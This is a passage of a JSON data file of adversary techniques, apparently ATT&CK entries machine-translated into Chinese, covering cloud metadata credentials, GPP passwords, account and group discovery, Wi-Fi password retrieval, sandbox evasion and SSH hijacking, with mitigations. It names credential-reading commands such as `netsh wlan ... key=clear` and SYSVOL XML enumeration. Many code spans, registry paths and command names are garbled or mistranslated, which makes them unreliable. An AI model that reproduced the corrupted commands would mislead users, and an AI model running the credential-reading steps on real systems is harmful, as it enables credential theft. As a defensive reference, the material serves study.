              "content": "使用强的密码键进行私钥，使开裂变得困难。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保在包含敏感私钥的文件夹上正确设置了权限，以防止意外访问。此外，在Cisco设备上，在RSA密钥对生成过程中设置"
            },
            {
              "type": "code",
              "content": "非XPORTABLE "
            },
            {
              "type": "text",
              "content": "标志。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.005",
    "name": "Cloud Instance Metadata API",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试访问云实例元数据API以收集凭据和其他敏感数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "大多数云服务提供商都支持云实例元数据API，该服务是为运行虚拟实例提供的服务，允许应用程序访问有关运行虚拟实例的信息。可用信息通常包括名称，安全组和其他元数据，包括敏感数据，例如凭据和用户数据脚本，这些脚本可能包含其他秘密。提供了实例元数据API，以方便地协助管理应用程序，并且可以访问该实例的任何人访问。云元数据API至少用于一个备受瞩目的妥协。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果对手在运行的虚拟实例上有存在，则可以直接查询实例元数据API以识别授予对其他资源的访问的凭据。此外，对手可以利用面向公共的Web代理中的服务器端请求伪造（SSRF）漏洞，该漏洞使他们能够通过请求访问敏感信息，从而通过请求访问该实例元数据API。"
        }
      ],
      [
        {
          "type": "text",
          "content": "跨云服务提供商的事实上的标准是在"
        },
        {
          "type": "code",
          "content": " http [：] // 169.254.169.254 "
        },
        {
          "type": "text",
          "content": "上托管实例元数据API。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用不必要的元数据服务，并限制或禁用用于防止对手访问的元数据服务的不安全版本。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对实例元数据API的访问。正确配置的Web应用程序防火墙（WAF）可能有助于防止外部对手利用服务器端请求伪造（SSRF）攻击，允许访问云实例元数据API。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "使用基于主机的防火墙（例如Iptables）限制对实例元数据API的访问。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.006",
    "name": "Group Policy Preferences",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试在小组策略偏好（GPP）中找到无抵押的凭据。GPP是允许管理员使用嵌入式凭据创建域策略的工具。这些政策允许管理员设置本地帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这些组策略存储在域控制器上的Sysvol中。这意味着任何域用户都可以查看SYSVOL共享并解密密码（使用已公开的AES密钥）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下工具和脚本可用于从组策略偏好XML文件中收集和解密密码文件："
        }
      ],
      [
        {
          "type": "list",
          "content": "Metasploit的邮政剥削模块：Post/Windows/Chatch/corterentials/gpp"
        },
        {
          "type": "list",
          "content": "GET-GPPPassword"
        },
        {
          "type": "list",
          "content": "gpprefdecrypt.py"
        }
      ],
      [
        {
          "type": "text",
          "content": "在SYSVOL共享上，对手可以使用以下命令来枚举潜在的GPP XML文件：<code> dir /s * .xml < /code>"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "删除弱势组策略首选项。"
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "搜索SYSVOL以查找可能包含凭据的任何现有GGP并将其删除。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "应用补丁KB2962486，以防止凭证存储在GPP中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.007",
    "name": "Container API",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在容器环境中通过API收集凭证。这些环境中的API，例如Docker API和Kubernetes API，允许用户远程管理其容器资源和群集组件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以访问Docker API，以收集包含环境中云，容器和其他各种资源的日志。具有足够权限的对手（例如通过POD的服务帐户）也可以使用Kubernetes API从Kubernetes API服务器中检索凭据。这些凭据可能包括Docker API身份验证所需的凭据或Kubernetes群集组件的秘密。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "将与容器服务的通信限制为托管和安全渠道，例如本地UNIX插座或通过SSH进行远程访问。需要安全端口访问，以通过禁用对Docker API和Kubernetes API服务器的未经身份验证的访问，与TLS通过TLS通信。在部署在云环境中的Kubernetes群集中，使用本机云平台功能限制允许访问API服务器的IP范围。在可能的情况下，考虑启用及时（JIT）访问Kubernetes API以对访问权限施加额外的限制。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "通过使用网络代理，网关和防火墙，拒绝直接远程访问内部系统。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用最低特权的原则，以作为特权帐户（例如Kubernetes中的服务帐户）。例如，如果不需要POD访问Kubernetes API，请考虑完全禁用服务帐户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "在容器API上执行身份验证和基于角色的访问控制，以将用户限制为所需的最低特权。使用kubernetes时，请避免给用户通配符权限或将用户添加到"
            },
            {
              "type": "code",
              "content": "系统：Masters "
            },
            {
              "type": "text",
              "content": "组，并使用"
            },
            {
              "type": "code",
              "content": " rolebbindings "
            },
            {
              "type": "text",
              "content": "而不是"
            },
            {
              "type": "code",
              "content": " clusterRolebindings "
            },
            {
              "type": "text",
              "content": "限制用户的特权到特定的名称空间。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.008",
    "name": "Chat Messages",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以直接收集通过用户通信服务存储或传递的无抵押凭据。凭据可以发送并存储在用户聊天通信应用程序中，例如电子邮件，聊天服务，例如Slack或Teams，Jira或Trello等协作工具以及任何支持用户通信的其他服务。用户可以在私人或公共公司内部通信渠道上共享各种形式的凭据（例如用户名和密码，API密钥或身份验证令牌）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过托管服务或通过云托管服务的管理员门户来直接访问存储的聊天日志（即文件中的凭据），而是可以在用户端点上直接访问这些服务中的凭据。对手也可能会损害Slack Workflows之类的集成工具，以自动搜索消息以提取用户凭据。然后可能会滥用这些凭证进行跟进活动，例如横向移动或特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "通过通信服务进行搜索，以找到共享的无抵押凭证。搜索常见模式，例如“ "
            },
            {
              "type": "code",
              "content": "密码为"
            },
            {
              "type": "text",
              "content": "”，“ "
            },
            {
              "type": "code",
              "content": " password = "
            },
            {
              "type": "text",
              "content": "”，并在发现时采取动作以减少曝光。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "确保开发人员和系统管理员意识到与在通信服务中共享无抵押密码相关的风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1087.001",
    "name": "Local Account",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Account Discovery",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试获取本地系统帐户的列表。这些信息可以帮助对手确定系统上存在哪些本地帐户，以帮助跟随行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "诸如"
        },
        {
          "type": "code",
          "content": " Net user "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " Net LocalGroup "
        },
        {
          "type": "text",
          "content": "之类的命令以及MacOS和Linux上的"
        },
        {
          "type": "code",
          "content": " ID> ID> ID "
        },
        {
          "type": "text",
          "content": " groups </code> groups </code>可以列出本地用户和组。在Linux上，也可以通过使用"
        },
        {
          "type": "code",
          "content": "/etc/passwd "
        },
        {
          "type": "text",
          "content": "文件来枚举本地用户。在MacOS上<code> dscl。LIST /用户< /code>命令可用于枚举本地帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "当应用程序通过UAC提升时，请防止管理员帐户被枚举，因为它可能导致帐户名称披露。注册表密钥位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ Credui \\ EnumerateadeadeadeadeadMinistrator "
            },
            {
              "type": "text",
              "content": "。可以通过GPO：计算机配置> [策略]>管理模板> Windows组件>凭据用户界面：枚举高程管理员帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1087.002",
    "name": "Domain Account",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Account Discovery",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试获取域帐户的列表。这些信息可以帮助对手确定存在哪些域帐户，以帮助跟随行为，例如针对具有特定特权的特定帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": ""
        },
        {
          "type": "code",
          "content": "诸如NET UTILITY的Net user/domain "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " Net of Net Utility的Net Group/域"
        },
        {
          "type": "text",
          "content": "之类的命令，"
        },
        {
          "type": "code",
          "content": " DSCACHEUTIL -Q Group </code </code </code </code </code </code </code "
        },
        {
          "type": "text",
          "content": "</code>在Linux上可以列出域用户和组。PowerShell cmdlet，包括"
        },
        {
          "type": "code",
          "content": " Get-Aduser "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " Get-Adgroupmember "
        },
        {
          "type": "text",
          "content": "可能会列举Active Directory组的成员。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "当应用程序通过UAC提升时，请防止管理员帐户被枚举，因为它可能导致帐户名称披露。注册表密钥位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ Credui \\ EnumerateadeadeadeadeadMinistrator "
            },
            {
              "type": "text",
              "content": "。可以通过GPO：计算机配置> [策略]>管理模板> Windows组件>凭据用户界面：枚举高程管理员帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1087.003",
    "name": "Email Account",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Account Discovery",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试获取电子邮件地址和帐户的清单。对手可以尝试转让交换地址列表，例如全局地址列表（GALS）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在本地交换和在线交换中，"
        },
        {
          "type": "code",
          "content": " get-globaladdresslist "
        },
        {
          "type": "text",
          "content": " PowerShell cmdlet可用于使用身份验证的会话从域中从域中获取电子邮件地址和帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Google Workspace中，通过Google Workspace Sync（GWSMO）服务与Microsoft Outlook用户共享GAL。此外，Google Workspace目录允许用户获取组织中其他用户的列表。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1087.004",
    "name": "Cloud Account",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Account Discovery",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试获取云帐户的清单。云帐户是由组织创建和配置的，供用户使用，远程支持，服务或云服务提供商或SaaS应用程序中的资源管理。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过经过身份验证的访问，可以使用几种工具来查找帐户。"
        },
        {
          "type": "code",
          "content": " get-msolrolemember "
        },
        {
          "type": "text",
          "content": " PowerShell cmdlet可用于在Office 365中获得赋予角色或权限组的帐户名。领域。命令"
        },
        {
          "type": "code",
          "content": " AZ AD用户列表"
        },
        {
          "type": "text",
          "content": "将列出域中的所有用户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "AWS命令"
        },
        {
          "type": "code",
          "content": " AWS IAM列表用户"
        },
        {
          "type": "text",
          "content": "可用于获取当前帐户中的用户列表，而"
        },
        {
          "type": "code",
          "content": " aws aws iam list-proles "
        },
        {
          "type": "text",
          "content": "可以获得具有指定路径的IAM角色字首。在GCP中，"
        },
        {
          "type": "code",
          "content": " gcloud IAM服务元清单"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " gcloud项目get-am-policy "
        },
        {
          "type": "text",
          "content": "可用于获取项目中的服务帐户和用户的清单。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查用户权限，以确保只有预期的用户才能列出IAM身份或以其他方式发现云帐户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制根据最少特权发现云帐户的许可。组织应限制具有IAM角色的组织中的用户数量，该角色具有行政特权，努力减少所有永久特权的角色分配，并对IAM用户，角色和政策进行定期权利审查。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1069.001",
    "name": "Local Groups",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Permission Groups Discovery",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试找到本地系统组和权限设置。本地系统许可组的知识可以帮助对手确定存在哪些组以及哪些用户属于特定组。对手可以使用此信息来确定哪些用户具有升高的权限，例如本地管理员组中的用户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "NET实用程序的"
        },
        {
          "type": "code",
          "content": " Net LocalGroup "
        },
        {
          "type": "text",
          "content": "命令，"
        },
        {
          "type": "code",
          "content": " dscl。-linux上的MACOS上的清单/组"
        },
        {
          "type": "text",
          "content": " </code> groups </code>可以列出本地组。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1069.002",
    "name": "Domain Groups",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Permission Groups Discovery",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试寻找域级组和权限设置。域级许可组的知识可以帮助对手确定存在哪些组以及哪些用户属于特定组。对手可以使用此信息来确定哪些用户具有升高的权限，例如域管理员。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Net Utility的"
        },
        {
          "type": "code",
          "content": " Net Group/域"
        },
        {
          "type": "text",
          "content": "命令，MACOS上的"
        },
        {
          "type": "code",
          "content": " dscaceutil -Q组"
        },
        {
          "type": "text",
          "content": "以及"
        },
        {
          "type": "code",
          "content": " ldapsearch </code "
        },
        {
          "type": "text",
          "content": " linux上的</code>。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1069.003",
    "name": "Cloud Groups",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Permission Groups Discovery",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试找到云组和权限设置。云许可组的知识可以帮助对手确定用户和组在环境中的特定作用，以及用户与特定组相关联。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过经过身份验证的访问，可以使用几种工具来查找权限组。"
        },
        {
          "type": "code",
          "content": " Get-Msolrole "
        },
        {
          "type": "text",
          "content": " PowerShell CMDLET可用于获得Exchange和Office 365帐户的角色和权限组。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Azure CLI（AZ CLI）和Google Cloud Identity提供商API还提供了获取权限组的接口。命令"
        },
        {
          "type": "code",
          "content": " AZ AD用户Get-Member-groups "
        },
        {
          "type": "text",
          "content": "将列出与Azure用户帐户关联的组，而API Endpoint "
        },
        {
          "type": "code",
          "content": "获取https://cloudidentity.googleapis.com/v1/groupsfies.com/groupsfies代码>列出可用于Google用户的组资源。在AWS中，命令 listrolopolicies "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " listAttachedRolepolicies "
        },
        {
          "type": "text",
          "content": "允许用户列举角色附加的策略。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会尝试列出对象的ACL，以确定所有者和其他帐户，例如通过AWS "
        },
        {
          "type": "code",
          "content": " getbucketacl "
        },
        {
          "type": "text",
          "content": " api。使用此信息，对手可以将带有权限的帐户定位给给定对象，或利用他们已经妥协以访问对象的帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1518.001",
    "name": "Security Software Discovery",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Software Discovery",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试获取安装在系统或云环境中的安全软件，配置，防御工具和传感器的列表。这可能包括诸如防火墙规则和反病毒之类的东西。对手可以在自动发现期间使用安全软件发现中的信息来塑造跟进行为，包括对手是否完全感染了目标和/或尝试特定的操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可用于获取安全软件信息的示例命令是Netsh，"
        },
        {
          "type": "code",
          "content": " reg Query "
        },
        {
          "type": "text",
          "content": "带有reg，"
        },
        {
          "type": "code",
          "content": "带有CMD和Taskelist的DIR "
        },
        {
          "type": "text",
          "content": "，但发现行为的其他指标可能更具体对于对手正在寻找的软件或安全系统的类型。看到Macos恶意软件执行Littlesnitch和KnockKnock软件的检查变得越来越普遍。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以利用云API来发现环境中防火墙规则的配置。例如，允许的IP范围，端口或用户帐户针对安全组的入站/出站规则，AWS内为EC2和/或VPC实例建立的虚拟防火墙，可以通过"
        },
        {
          "type": "code",
          "content": " Dicdict> execurityGroups </code </code </code </code </code </code </code </code </code "
        },
        {
          "type": "text",
          "content": "各种请求参数。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1614.001",
    "name": "System Language Discovery",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "System Location Discovery",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图收集有关受害者系统语言的信息，以推断该主机的地理位置。这些信息可用于塑造后续行为，包括对手是否感染目标和/或尝试特定的动作。恶意软件开发商和运营商可以采用此决定来减少他们吸引特定执法机构注意的风险或其他实体的起诉/审查。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以用来推断系统语言的各种数据来源，例如系统默认值和键盘布局。特定的检查将根据目标和/或对手而有所不同，但可能涉及诸如查询注册表和对本机API功能的调用之类的行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在Windows系统上，对手可能会尝试通过查询注册表密钥"
        },
        {
          "type": "code",
          "content": " HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlSet \\ Contrantrolset \\ control \\ nls \\ nls \\ Language </code </code "
        },
        {
          "type": "text",
          "content": "或解析Windows API功能的输出<code <code <code <coper> getUserDefaultUIlanguage </code>，"
        },
        {
          "type": "code",
          "content": " getSystemDefaultUilanguage "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " getKeyboardLayOutlist "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " getUserDefeaultLangid "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在MacOS或Linux系统上，对手可能会查询"
        },
        {
          "type": "code",
          "content": " locale "
        },
        {
          "type": "text",
          "content": "以检索"
        },
        {
          "type": "code",
          "content": " $ lang "
        },
        {
          "type": "text",
          "content": "环境变量的值。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1016.001",
    "name": "Internet Connection Discovery",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "System Network Configuration Discovery",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会检查损坏的系统上的互联网连接。这可以在自动发现期间执行，并且可以通过多种方式完成，例如使用ping，"
        },
        {
          "type": "code",
          "content": " tracert "
        },
        {
          "type": "text",
          "content": "，并获取到网站的请求。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这些请求的结果和响应来确定系统是否能够在尝试连接到它们之前与C2服务器进行通信。结果也可用于识别路由，重定向器和代理服务器。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1016.002",
    "name": "Wi-Fi Discovery",
    "tactics": [
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "System Network Configuration Discovery",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在折衷的系统上搜索有关Wi-Fi网络（例如网络名称和密码）的信息。对手可以使用Wi-Fi信息作为帐户发现，远程系统发现以及其他发现或凭据访问活动的一部分来支持正在进行的和将来的广告系列。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会从主机收集有关Wi-Fi网络的各种类型的信息。例如，在所有Wi-Fi网络的Windows名称和密码上，设备以前已连接到的所有Wi-Fi网络都可以通过"
        },
        {
          "type": "code",
          "content": " Netsh WLAN显示profiles "
        },
        {
          "type": "text",
          "content": "枚举Wi-Fi名称，然后"
        },
        {
          "type": "code",
          "content": " Netsh WLAN Show profile“ wi-fi名称” key = clear "
        },
        {
          "type": "text",
          "content": "显示Wi-Fi网络的相应密码。此外，可以使用"
        },
        {
          "type": "code",
          "content": " wlanapi.dll "
        },
        {
          "type": "text",
          "content": "本机API函数的呼叫来发现本地可访问的Wi-Fi网络的名称和其他详细信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux上，设备先前已连接到的所有Wi-Fi-networks的名称和密码可能可在"
        },
        {
          "type": "code",
          "content": "/etc/etcement/networkManager/system-connections/"
        },
        {
          "type": "text",
          "content": "下的文件中提供。在MACOS上，可以使用"
        },
        {
          "type": "code",
          "content": "安全性find-generic-password -wa wifiname "
        },
        {
          "type": "text",
          "content": "识别已知Wi-Fi的密码（需要管理用户名/密码）。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1497.001",
    "name": "System Checks",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Virtualization/Sandbox Evasion",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用各种系统检查来检测和避免虚拟化和分析环境。这可能包括根据指示虚拟机环境（VME）或沙盒的伪像的检查结果的改变行为。如果对手发现VME，他们可能会改变其恶意软件以使受害者脱离受害者或掩盖植入物的核心功能。他们还可以在删除次要或其他有效载荷之前搜索VME工件。对手可以使用自动化发现期间虚拟化/沙盒逃避中学到的信息来塑造跟进行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "特定的检查将根据目标和/或对手而有所不同，但可能涉及诸如Windows Management Instrumentation，PowerShell，系统信息发现和查询注册表之类的行为，以获取系统信息并搜索VME文物。对手可以在内存，过程，文件系统，硬件和/或注册表中搜索VME工件。对手可以使用脚本将这些检查自动化为一个脚本，然后将程序退出如果确定系统为虚拟环境，则将其退出。"
        }
      ],
      [
        {
          "type": "text",
          "content": "检查可能包括通用系统属性，例如主机/域名和网络流量的示例。对手还可以检查网络适配器地址，CPU核心计数以及可用的内存/驱动器大小。"
        }
      ],
      [
        {
          "type": "text",
          "content": "其他常见的检查可能会列举这些应用程序所独有的服务，系统上的程序，与虚拟机应用有关的字符串制造商/产品字段以及特定于VME的硬件/处理器说明。在诸如VMware之类的应用程序中，对手也可以使用特殊的I/O端口来发送命令并接收输出。"
        }
      ],
      [
        {
          "type": "text",
          "content": "硬件检查（例如风扇，温度和音频设备的存在）也可以用于收集可以指示虚拟环境的证据。对手也可能会查询这些设备的特定读数。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1497.002",
    "name": "User Activity Based Checks",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Virtualization/Sandbox Evasion",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用各种用户活动检查来检测和避免虚拟化和分析环境。这可能包括根据指示虚拟机环境（VME）或沙盒的伪像的检查结果的改变行为。如果对手发现VME，他们可能会改变其恶意软件以使受害者脱离受害者或掩盖植入物的核心功能。他们还可以在删除次要或其他有效载荷之前搜索VME工件。对手可以使用自动化发现期间虚拟化/沙盒逃避中学到的信息来塑造跟进行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以根据变量在主机上搜索用户活动，例如鼠标移动和点击的速度/频率，浏览器历史记录，缓存，书签或常见目录中的文件数量，例如家庭或桌面。其他方法可能会在激活恶意代码之前与系统的特定互动，例如等待文档在激活宏或等待用户双击嵌入式图像以激活激活之前关闭。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1497.003",
    "name": "Time Based Evasion",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0007",
        "name": "Discovery"
      }
    ],
    "technique": "Virtualization/Sandbox Evasion",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用各种基于时间的方法来检测和避免虚拟化和分析环境。这可能包括列举基于时间的属性，例如正常运行时间或系统时钟，以及使用计时器或其他触发器避免使用虚拟机环境（VME）或沙盒，特别是自动化或仅在有限的多少时间。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以采用各种基于时间的逃避，例如使用程序化睡眠命令或本机系统调度功能在初始执行时延迟恶意软件功能（例如：计划/计划/作业）。延迟也可能基于等待特定的受害者条件（例如：系统时间，事件等）或采用预定的多阶段渠道，以避免分析和审查。"
        }
      ],
      [
        {
          "type": "text",
          "content": "良性命令或其他操作也可以用于延迟恶意软件的执行。循环或其他不必要的命令重复（例如ping）可用于延迟恶意软件的执行，并可能超过自动分析环境的时间阈值。通常称为API锤式的另一种变体涉及对本机API功能进行各种调用，以延迟执行（同时也可能与垃圾数据将分析环境超载分析环境）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以将时间用作指标来检测沙盒和分析环境，尤其是那些试图操纵时间机制以模拟时间较长的时间的人。例如，对手可能能够通过在执行睡眠函数之前和之后对环境时间戳的预期值进行采样和计算，以识别沙盒加速时间。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1563.001",
    "name": "SSH Hijacking",
    "tactics": [
      {
        "id": "TA0008",
        "name": "Lateral Movement"
      }
    ],
    "technique": "Remote Service Session Hijacking",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会劫持合法的用户的SSH会话，以在环境中横向移动。安全外壳（SSH）是Linux和MacOS系统上远程访问的标准手段。它允许用户通过加密的隧道连接到另一系统，通常通过密码，证书或使用非对称加密密钥对进行身份验证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了从受感染的主机横向移动，对手可以通过劫持现有连接到另一系统的现有连接，利用通过活动SSH会话中的公共密钥认证建立的信任关系。这可以通过损害SSH代理本身或访问代理插座而发生。如果对手能够获得根访问，则劫持SSH会话可能很微不足道。"
        }
      ],
      [
        {
          "type": "text",
